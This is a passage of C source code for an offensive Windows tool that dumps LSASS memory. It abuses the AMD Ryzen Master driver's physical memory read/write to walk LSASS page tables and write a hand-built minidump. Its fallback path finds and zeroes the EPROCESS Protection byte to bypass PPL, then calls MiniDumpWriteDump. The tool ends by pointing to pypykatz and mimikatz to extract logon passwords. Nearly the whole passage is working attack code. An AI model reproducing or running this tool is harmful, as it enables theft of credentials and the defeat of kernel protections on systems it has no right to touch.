    if (g_npages == 0) return;

    g_regions[0].base_va   = g_pages[0].va;
    g_regions[0].size      = 0x1000;
    g_regions[0].start_idx = 0;
    g_nregions = 1;

    for (int i = 1; i < g_npages && g_nregions < MAX_REGIONS; i++) {
        Region *r = &g_regions[g_nregions-1];
        if (g_pages[i].va == r->base_va + r->size) {
            r->size += 0x1000;  /* extend current region */
        } else {
            /* new region */
            g_regions[g_nregions].base_va   = g_pages[i].va;
            g_regions[g_nregions].size      = 0x1000;
            g_regions[g_nregions].start_idx = i;
            g_nregions++;
        }
    }

    printf("  Merged into %d contiguous regions\n", g_nregions);
}

/* ══════════════════════════════════════════════════════════════════════
 * §7  MINIDUMP WRITER
 *
 * Format: MINIDUMP_HEADER + DIRECTORY[3] + SystemInfoStream
 *         + ModuleListStream (with name strings) + Memory64ListStream
 *         + all page data (streamed directly from physical memory)
 * ══════════════════════════════════════════════════════════════════════ */

/* Packed structs — exact byte layout matches Windows MiniDump spec */
#pragma pack(push,4)

typedef struct {
    uint32_t Signature;        /* 'MDMP' = 0x504D444D */
    uint32_t Version;          /* MINIDUMP_VERSION = 0xA793FFFF */
    uint32_t NumberOfStreams;
    uint32_t StreamDirectoryRva;
    uint32_t CheckSum;
    uint32_t TimeDateStamp;
    uint64_t Flags;
} MD_HEADER;                   /* 32 bytes */

typedef struct {
    uint32_t StreamType;
    uint32_t DataSize;
    uint32_t Rva;
} MD_DIRECTORY;                /* 12 bytes */

typedef struct {
    uint16_t ProcessorArchitecture;
    uint16_t ProcessorLevel;
    uint16_t ProcessorRevision;
    uint8_t  NumberOfProcessors;
    uint8_t  ProductType;
    uint32_t MajorVersion;
    uint32_t MinorVersion;
    uint32_t BuildNumber;
    uint32_t PlatformId;
    uint32_t CSDVersionRva;
    uint16_t SuiteMask;
    uint16_t Reserved2;
    uint64_t ProcessorFeatures[2];
} MD_SYSTEM_INFO;              /* 48 bytes */

typedef struct {
    uint32_t DataSize;
    uint32_t Rva;
} MD_LOCATION;                 /* 8 bytes */

typedef struct {
    uint32_t dwSignature;
    uint32_t dwStrucVersion;
    uint32_t dwFileVersionMS;
    uint32_t dwFileVersionLS;
    uint32_t dwProductVersionMS;
    uint32_t dwProductVersionLS;
    uint32_t dwFileFlagsMask;
    uint32_t dwFileFlags;
    uint32_t dwFileOS;
    uint32_t dwFileType;
    uint32_t dwFileSubtype;
    uint32_t dwFileDateMS;
    uint32_t dwFileDateLS;
} MD_VS_FIXEDFILEINFO;         /* 52 bytes */

typedef struct {
    uint64_t     BaseOfImage;
    uint32_t     SizeOfImage;
    uint32_t     CheckSum;
    uint32_t     TimeDateStamp;
    uint32_t     ModuleNameRva;
    MD_VS_FIXEDFILEINFO VersionInfo;  /* 52 bytes */
    MD_LOCATION  CvRecord;
    MD_LOCATION  MiscRecord;
    uint64_t     Reserved0;
    uint64_t     Reserved1;
} MD_MODULE;                   /* 108 bytes */

typedef struct {
    uint64_t NumberOfMemoryRanges;
    uint64_t BaseRva;          /* file offset where memory data starts */
} MD_MEM64_LIST_HDR;           /* 16 bytes */

typedef struct {
    uint64_t StartOfMemoryRange;
    uint64_t DataSize;
} MD_MEM64_DESC;               /* 16 bytes */

#pragma pack(pop)

/* Stream type constants */
#define MD_STREAM_SYSTEM_INFO  9
#define MD_STREAM_MODULE_LIST  4
#define MD_STREAM_MEMORY64     15

static int write_minidump(const char *path)
{
    HANDLE fh = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fh == INVALID_HANDLE_VALUE) {
        printf("  [!] Cannot create %s (err=%lu)\n", path, GetLastError());
        return 0;
    }

    /* ── Calculate sizes and offsets ─────────────────────────── */

    /* File layout:
     *  [0]          MD_HEADER            (32)
     *  [32]         MD_DIRECTORY[3]      (36)
     *  [68]         MD_SYSTEM_INFO       (48)          ← stream 1
     *  [116]        MD_MODULE_LIST       (4 + nmods*108)  ← stream 2
     *  [116+ms2]    module name strings  (variable)
     *  [116+ms2+ns] MD_MEM64_LIST header+descriptors  ← stream 3
     *  [mem_data_rva] all page data                   ← payload
     */

    uint32_t off_sysinfo   = 68;
    uint32_t sz_sysinfo    = sizeof(MD_SYSTEM_INFO);

    uint32_t off_modlist   = off_sysinfo + sz_sysinfo;
    /* module list = 4-byte count + N × 108 bytes */
    uint32_t sz_modlist_core = 4 + g_nmods * (uint32_t)sizeof(MD_MODULE);

    /* module name strings: each = 4-byte length (bytes) + wchar[] */
    uint32_t off_names = off_modlist + sz_modlist_core;
    uint32_t *name_rvas = (uint32_t*)calloc(g_nmods, sizeof(uint32_t));
    if (!name_rvas) { CloseHandle(fh); return 0; }
    uint32_t names_total = 0;
    for (int i = 0; i < g_nmods; i++) {
        name_rvas[i] = off_names + names_total;
        int wlen = (int)strlen(g_mods[i].name); /* chars */
        names_total += 4 + (uint32_t)(wlen * 2); /* ULONG len + WCHAR[] */
    }

    uint32_t off_mem64     = off_names + names_total;
    uint32_t sz_mem64_hdr  = (uint32_t)sizeof(MD_MEM64_LIST_HDR);
    uint32_t sz_mem64_descs = g_nregions * (uint32_t)sizeof(MD_MEM64_DESC);
    uint32_t sz_mem64_total = sz_mem64_hdr + sz_mem64_descs;

    uint32_t mem_data_rva  = off_mem64 + sz_mem64_total;

    /* Total size of streams for directory entries */
    uint32_t sz_modlist    = sz_modlist_core + names_total;

    /* ── Write MINIDUMP_HEADER ───────────────────────────────── */
    MD_HEADER hdr = {0};
    hdr.Signature           = 0x504D444D;   /* 'MDMP' */
    hdr.Version             = 0xA793FFFF;
    hdr.NumberOfStreams      = 3;
    hdr.StreamDirectoryRva  = 32;
    hdr.TimeDateStamp       = (uint32_t)time(NULL);
    hdr.Flags               = 0x0002;       /* MiniDumpWithFullMemory */

    DWORD written = 0;
    WriteFile(fh, &hdr, sizeof hdr, &written, NULL);

    /* ── Write MINIDUMP_DIRECTORY[3] ─────────────────────────── */
    MD_DIRECTORY dirs[3];
    dirs[0].StreamType = MD_STREAM_SYSTEM_INFO;
    dirs[0].DataSize   = sz_sysinfo;
    dirs[0].Rva        = off_sysinfo;

    dirs[1].StreamType = MD_STREAM_MODULE_LIST;
    dirs[1].DataSize   = sz_modlist;
    dirs[1].Rva        = off_modlist;

    dirs[2].StreamType = MD_STREAM_MEMORY64;
    dirs[2].DataSize   = sz_mem64_total;
    dirs[2].Rva        = off_mem64;

    WriteFile(fh, dirs, sizeof dirs, &written, NULL);

    /* ── Write SystemInfoStream ──────────────────────────────── */
    typedef LONG (WINAPI *pfnRtlGetVersion)(OSVERSIONINFOW*);
    OSVERSIONINFOW ov = {sizeof ov};
    pfnRtlGetVersion rtlver = (pfnRtlGetVersion)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    if (rtlver) rtlver(&ov);

    SYSTEM_INFO si = {0};
    GetNativeSystemInfo(&si);

    MD_SYSTEM_INFO sys = {0};
    sys.ProcessorArchitecture = 9;   /* PROCESSOR_ARCHITECTURE_AMD64 */
    sys.NumberOfProcessors    = (uint8_t)si.dwNumberOfProcessors;
    sys.ProductType           = 1;   /* VER_NT_WORKSTATION */
    sys.MajorVersion          = ov.dwMajorVersion  ? ov.dwMajorVersion  : 10;
    sys.MinorVersion          = ov.dwMinorVersion;
    sys.BuildNumber           = ov.dwBuildNumber;
    sys.PlatformId            = 2;   /* VER_PLATFORM_WIN32_NT */
    WriteFile(fh, &sys, sizeof sys, &written, NULL);

    /* ── Write ModuleListStream ──────────────────────────────── */
    uint32_t nmod = (uint32_t)g_nmods;
    WriteFile(fh, &nmod, 4, &written, NULL);

    for (int i = 0; i < g_nmods; i++) {
        MD_MODULE mod = {0};
        mod.BaseOfImage    = g_mods[i].base_va;
        mod.SizeOfImage    = g_mods[i].size_of_image;
        mod.TimeDateStamp  = g_mods[i].timestamp;
        mod.ModuleNameRva  = name_rvas[i];
        mod.VersionInfo.dwSignature = 0xFEEF04BD;
        WriteFile(fh, &mod, sizeof mod, &written, NULL);
    }

    /* Write module name strings (ULONG len_bytes + WCHAR[]) */
    for (int i = 0; i < g_nmods; i++) {
        int wlen = (int)strlen(g_mods[i].name);
        uint32_t blen = (uint32_t)(wlen * 2);
        WriteFile(fh, &blen, 4, &written, NULL);
        /* Convert ASCII → UTF-16LE inline */
        for (int k = 0; k < wlen; k++) {
            uint16_t wc = (uint8_t)g_mods[i].name[k];
            WriteFile(fh, &wc, 2, &written, NULL);
        }
    }
    free(name_rvas);

    /* ── Write Memory64ListStream header + descriptors ───────── */
    MD_MEM64_LIST_HDR m64hdr = {0};
    m64hdr.NumberOfMemoryRanges = (uint64_t)g_nregions;
    m64hdr.BaseRva              = (uint64_t)mem_data_rva;
    WriteFile(fh, &m64hdr, sizeof m64hdr, &written, NULL);

    for (int i = 0; i < g_nregions; i++) {
        MD_MEM64_DESC desc = {0};
        desc.StartOfMemoryRange = g_regions[i].base_va;
        desc.DataSize           = g_regions[i].size;
        WriteFile(fh, &desc, sizeof desc, &written, NULL);
    }

    /* ── Stream page data from physical memory to file ──────── */
    printf("  Writing memory data...\n");
    static uint8_t page[4096];
    uint64_t bytes_written = 0;
    uint64_t last_report   = 0;

    for (int ri = 0; ri < g_nregions; ri++) {
        int start = g_regions[ri].start_idx;
        int npg   = (int)(g_regions[ri].size / 0x1000);
        for (int pi = 0; pi < npg; pi++) {
            /* Read page from physical memory */
            int ok = phys_read(g_pages[start+pi].pa, page, 4096);
            if (!ok) memset(page, 0, 4096);  /* unreadable → zero-fill */
            WriteFile(fh, page, 4096, &written, NULL);
            bytes_written += 4096;
        }
        if (bytes_written - last_report >= 0x4000000ULL) {
            printf("  [%3llu MB written]\r", (unsigned long long)(bytes_written>>20));
            fflush(stdout);
            last_report = bytes_written;
        }
    }

    CloseHandle(fh);
    printf("\n  Done. %llu MB written to %s\n",
           (unsigned long long)(bytes_written>>20), path);
    return 1;
}

/* ══════════════════════════════════════════════════════════════════════
 * §8  MAIN
 * ══════════════════════════════════════════════════════════════════════ */

int main(int argc, char *argv[])
{
    const char *outpath = (argc > 1) ? argv[1] : "lsass.dmp";

    printf("╔══════════════════════════════════════════════╗\n");
    printf("║  LSASS Physical Dump — AMD Ryzen Master R/W  ║\n");
    printf("╚══════════════════════════════════════════════╝\n\n");

    /* Enable SeDebugPrivilege — required for NtQuerySystemInformation(11)
     * on Win10/11 when querying kernel module list. */
    enable_debug_privilege();

    /* Open AMD driver */
    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ|GENERIC_WRITE,
                        FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                        OPEN_EXISTING, 0, NULL);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[!] Cannot open AMDRyzenMasterDriverV20 (err=%lu)\n"
               "    Is the driver loaded? Run as Administrator.\n",
               GetLastError());
        return 1;
    }
    printf("[+] AMD driver opened\n");

    /* Load physical RAM ranges */
    load_ranges();
    if (g_nranges == 0) {
        printf("[!] No physical ranges found\n");
        CloseHandle(g_dev);
        return 1;
    }
    printf("[+] Physical ranges: %d\n", g_nranges);

    /* Get ntoskrnl VA first — needed to validate kernel CR3 against KPTI
     * User-Shadow CR3 (which lacks kernel mappings and fools self-ref scan). */
    uint64_t ntoskrnl_va = 0;
    {
        typedef NTSTATUS(NTAPI*PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);
        PFN_NTQSI fn2 = (PFN_NTQSI)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
        typedef struct {
            HANDLE Section; PVOID MappedBase, ImageBase;
            ULONG  ImageSize, Flags;
            USHORT LoadOrderIndex, InitOrderIndex, LoadCount, OffsetToFileName;
            CHAR   FullPathName[256];
        } ME2; typedef struct { ULONG N; ME2 M[1]; } ML2;
        ULONG sz2=0x80000; ML2 *ml2=NULL; NTSTATUS st2;
        if (fn2) {
            do { free(ml2); ml2=(ML2*)malloc(sz2*=2);
                 st2=fn2(11,ml2,sz2,NULL); } while(st2==(NTSTATUS)0xC0000004L);
            if (!st2) {
                for (ULONG i=0;i<ml2->N;i++) {
                    const char *n2=ml2->M[i].FullPathName+ml2->M[i].OffsetToFileName;
                    if(_stricmp(n2,"ntoskrnl.exe")==0||_stricmp(n2,"ntkrnlmp.exe")==0){
                        ntoskrnl_va=(uint64_t)ml2->M[i].ImageBase; break;
                    }
                }
            }
            free(ml2);
        }
    }
    if (ntoskrnl_va)
        printf("[+] ntoskrnl VA = 0x%016llX (used for CR3 validation)\n",
               (unsigned long long)ntoskrnl_va);
    else
        printf("[!] ntoskrnl VA unknown — CR3 validation skipped\n");

    /* Find kernel CR3, validated against KPTI UserCR3 false positives */
    printf("[*] Finding kernel CR3...\n");
    g_kernel_cr3 = find_kernel_cr3(ntoskrnl_va);
    if (!g_kernel_cr3)
        printf("[!] Kernel CR3 not found — Method A will fail, Method B still works\n");
    else
        printf("[+] Kernel CR3 = 0x%016llX\n", (unsigned long long)g_kernel_cr3);

    /* Get LSASS PID */
    uint32_t lsass_pid = lsass_get_pid();
    if (!lsass_pid) {
        printf("[!] lsass.exe not found in process list\n");
        CloseHandle(g_dev);
        return 1;
    }
    printf("[+] LSASS PID = %u\n", lsass_pid);

    /* Find LSASS EPROCESS and read its CR3 (DirectoryTableBase) */
    printf("[*] Locating LSASS EPROCESS in physical memory...\n");
    uint64_t lsass_cr3  = 0;
    uint64_t lsass_eproc = lsass_find_eprocess(lsass_pid, &lsass_cr3);
    if (!lsass_eproc || !lsass_cr3) {
        printf("[!] LSASS EPROCESS not found\n");
        CloseHandle(g_dev);
        return 1;
    }

    /* Walk LSASS page tables */
    printf("[*] Enumerating LSASS pages...\n");
    int npages = enumerate_lsass_pages(lsass_cr3, lsass_eproc);

    if (npages > 0) {
        /* ── Physical page dump path (non-Hyper-V) ── */
        printf("[*] Discovering modules...\n");
        discover_modules();
        printf("[*] Building memory regions...\n");
        build_regions();
        printf("[*] Writing %s...\n", outpath);
        if (!write_minidump(outpath)) { CloseHandle(g_dev); return 1; }

    } else {
        /* ── API fallback: PPL bypass via phys_write + MiniDumpWriteDump ──
         * Works on Hyper-V where page table walk is SLAT-blocked.
         * Requires dbghelp.dll (present on all Windows installs). */
        printf("[!] Page table walk failed (Hyper-V SLAT?).\n");
        printf("[*] Falling back to MiniDumpWriteDump after PPL bypass...\n");

        /* Find Protection byte offset using NtQIP as ground truth */
        typedef NTSTATUS (NTAPI *PFN_NtQIP)(HANDLE,ULONG,PVOID,ULONG,PULONG);
        PFN_NtQIP ntqip = (PFN_NtQIP)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");

        uint8_t prot_orig = 0;
        uint32_t prot_off = 0;
        if (ntqip) {
            HANDLE hq = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, lsass_pid);
            if (hq) { ntqip(hq, 61, &prot_orig, 1, NULL); CloseHandle(hq); }
        }
        printf("    LSASS Protection = 0x%02X (NtQIP)\n", prot_orig);

        if (prot_orig) {
            /* Probe candidates to find Protection offset */
            static const uint32_t cands[] = {
                0x4FA, 0x87A, 0x6B0, 0x878, 0x880, 0x6FA, 0x7FA, 0x5FA, 0
            };
            for (int ci = 0; cands[ci] && !prot_off; ci++) {
                uint64_t field_pa = lsass_eproc + cands[ci];
                uint8_t orig = 0, z = 0;
                phys_read(field_pa, &orig, 1);
                if (orig != prot_orig) continue;
                phys_write(field_pa, &z, 1);
                Sleep(5);
                uint8_t post = 0;
                if (ntqip) {
                    HANDLE hq = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, lsass_pid);
                    if (hq) { ntqip(hq, 61, &post, 1, NULL); CloseHandle(hq); }
                }
                phys_write(field_pa, &orig, 1); /* restore immediately */
                if (post == 0) {
                    prot_off = cands[ci];
                    printf("    Protection offset = 0x%X (confirmed)\n", prot_off);
                }
            }
        }

        if (!prot_off && prot_orig) {
            printf("    [!] Could not confirm Protection offset (Huorong watchdog?)\n"
                   "    Attempting dump anyway with direct OpenProcess...\n");
        }

        /* Clear Protection */
        uint8_t z = 0;
        if (prot_off) phys_write(lsass_eproc + prot_off, &z, 1);

        /* Open LSASS */
        HANDLE hlsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
        if (!hlsass) {
            printf("    [!] OpenProcess failed err=%lu\n", GetLastError());
            if (prot_off) phys_write(lsass_eproc + prot_off, &prot_orig, 1);
            CloseHandle(g_dev); return 1;
        }
        printf("    [+] OpenProcess succeeded\n");

        /* MiniDumpWriteDump */
        typedef BOOL (WINAPI *PFN_MDD)(HANDLE,DWORD,HANDLE,DWORD,
                                        PVOID,PVOID,PVOID);
        HMODULE hdb = LoadLibraryA("dbghelp.dll");
        PFN_MDD mdd = hdb ? (PFN_MDD)GetProcAddress(hdb,"MiniDumpWriteDump") : NULL;

        if (!mdd) {
            printf("    [!] MiniDumpWriteDump not available\n");
        } else {
            HANDLE hfile = CreateFileA(outpath, GENERIC_WRITE, 0, NULL,
                                       CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hfile == INVALID_HANDLE_VALUE) {
                printf("    [!] Cannot create %s\n", outpath);
            } else {
                BOOL ok = mdd(hlsass, lsass_pid, hfile,
                               0x00000002 /*MiniDumpWithFullMemory*/,
                               NULL, NULL, NULL);
                CloseHandle(hfile);
                if (ok) printf("[+] SUCCESS via MiniDumpWriteDump\n");
                else {
                    printf("    [!] MiniDumpWriteDump failed err=%lu\n", GetLastError());
                    DeleteFileA(outpath);
                }
            }
        }

        CloseHandle(hlsass);
        if (prot_off) phys_write(lsass_eproc + prot_off, &prot_orig, 1);
        if (hdb) FreeLibrary(hdb);
    }

    CloseHandle(g_dev);

    printf("\n    Parse with:\n");
    printf("      pypykatz lsa minidump %s\n", outpath);
    printf("      mimikatz> sekurlsa::minidump %s\n", outpath);
    printf("               sekurlsa::logonpasswords\n");
    return 0;
}
